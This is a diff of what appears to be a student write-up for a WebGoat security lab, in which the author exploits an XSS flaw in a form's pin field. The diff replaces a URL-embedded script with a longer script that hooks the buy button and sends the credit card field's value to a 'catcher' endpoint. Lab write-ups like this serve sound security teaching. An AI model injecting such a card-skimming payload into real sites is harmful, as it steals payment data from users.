@@ -9,7 +9,14 @@ In this part I realized that the pin field of the form is vulnerable to script i
 the pin parameter such that it will take the card number object from the DOM and sends its value to the malicious 
 endpoint. The non-encoded URL is as follows:
 ```$xslt
-http://localhost:8090/WebGoat/start.mvc#attack/1731484628/900?input1&input2=<SCRIPT>XSSImage=new Image;XSSImage.src="http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCreditCard=document.form.input1.value"</SCRIPT>
+<SCRIPT>
+	document.form.input2.value=111;
+	document.form.buy.onclick=function(){
+		XSSImage=new Image;
+		XSSImage.src='http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCreditCard=document.form.input1.value';
+	}
+	document.getElementById('message').innerHTML='';
+</SCRIPT>
 ```
 
 ## Part 3:
